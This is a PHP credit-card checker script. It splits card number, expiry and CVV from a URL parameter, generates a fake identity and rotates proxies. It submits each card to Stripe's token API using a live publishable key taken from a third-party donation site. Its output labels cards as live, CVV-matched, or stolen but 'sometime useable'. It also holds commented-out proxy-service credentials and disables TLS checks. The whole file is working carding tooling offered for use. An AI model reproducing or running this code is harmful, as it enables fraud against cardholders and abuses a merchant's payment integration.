<?php

#---------------[ RECOMPILED BY NOT-U ]---------------#

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
}
function proxys() 
{ 
  $poxyHttps = file("proxy.txt"); 
  $myproxy = rand(0, sizeof($poxyHttps) - 1); 
  $poxyHttps = $poxyHttps[$myproxy]; 
  return $poxyHttps; 
} 
$proxy = proxys();  

#---------------[ RANDOMUSR AUTH ]---------------#

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details] 
//$time = rand(00000,99999);
//$ttc = '0.'.rand(1,9).'s';
//$username = 'lum-customer-hl_4199083e';
//$password = '5hfjskdmendiwjd';
//$port = 80;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum.superproxy.io';

#---------------[ 1ST AUTH ]---------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.conductiveed.com&stripe_xdm_c=default145646&stripe_xdm_p=1',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1&time_on_page=87941&pasted_fields=number&guid=NA&muid=24ea7878-a125-43a4-a53c-a05e74d88f6f&sid=cbd71e31-befd-4dd3-9653-f90ad6fdbcd4&key=pk_live_rnToSSR8zh8Q4ElwbwLADYXO&payment_user_agent=stripe.js%2F8ab9a2f&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=Mark+Kise&card[address_line1]=&card[address_city]=&card[address_zip]=&card[address_state]=OH&card[address_country]=US');
$result = curl_exec($ch);

#---------------[ CARD RESPONSE ]---------------#

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Aprovada Diakosiwise™</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">🔥 CVV MATCHED BORN 🔥</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </br>';
}
elseif (strpos($result, '"status":"success"')) { 
    echo '<span class="badge badge-success">Aprovada Diakosiwise™</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">🔥 CVV MATCHED BORN 🔥</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </br>'; 
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success"> Aprovada Diakosiwise™</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">🔥 CVV MATCHED BORN 🔥</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success"> Aprovada Diakosiwise™</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">🔥 CVV MATCHED BORN 🔥</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-info">Reprova</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-warning">CCN LIVE</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, "incorrect_cvc")) { 
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-warning">CCN LIVE</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success"> Aprovada Diakosiwise™</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">🔥 CVV MATCHED BORN 🔥 - Incorrect Zip</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-danger"> Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-danger"></span> <span class="badge badge-danger">Stolen_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-info"> Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Lost_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-info"> Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Insufficient Funds</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger"> Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Card Expired</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</br>';
} 
elseif (strpos($result, "pickup_card")) {  
  echo '<span class="badge badge-info">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Pickup Card_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Incorrect Card Number</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp></br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger"> Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Incorrect Card Number</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Generic_Decline</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Do_Not_Honor</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Security Code Unchecked</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Security Code Check : Fail</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Expired Card</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-danger">Card Doesnt Support This Purchase</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </br>';
}
 else {
  echo '<span class="badge badge-danger">  Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-">'. $lista .'</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-danger">Proxy Dead/Unavailable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </br>';
}

curl_close($ch);
ob_flush();
#---------------[ RECOMPILED BY NOT-U ]---------------#
echo $result

?>
